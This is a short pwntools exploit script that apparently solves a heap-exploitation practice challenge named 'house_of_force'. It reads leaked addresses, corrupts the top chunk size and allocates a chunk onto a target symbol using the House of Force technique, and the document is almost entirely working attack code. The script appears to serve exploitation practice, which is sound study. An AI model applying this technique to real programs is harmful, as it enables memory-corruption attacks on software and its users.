from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./house_of_force', checksec=False)

libc = elf.libc

environ = {"LD_PRELOAD": libc.path}

gs = """
b *main
b *main+295
b *main+448
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
rcu = lambda data: io.recvuntil(data)
    
def start():
    if args.GDB:
        return gdb.debug(elf.path, env=environ, gdbscript=gs)
    else:
        return process(elf.path)
    
def malloc(size, data):
    rcu(b'> ')
    s(b'1')
    rcu(b'size: ')
    s(f'{size}'.encode())
    rcu(b'data: ')
    s(data)
 
def delta(x, y):
    return (0xffffffffffffffff - x) + y
   
io = start()

rcu(b'puts() @ ')
puts_leak = int(io.recvline(), 16) 
rcu(b'heap @ ')
heap_leak = int(io.recvline(), 16)

success(f"puts @ {hex(puts_leak)}")
success(f"heap @ {hex(heap_leak)}")

distance = delta(heap_leak + 0x20, elf.sym['target'] - 0x20)

malloc(24, b'a'*24 + p64(0xffffffffffffffff))
malloc(distance, b'oke')
malloc(24, b'You win')

io.interactive() 
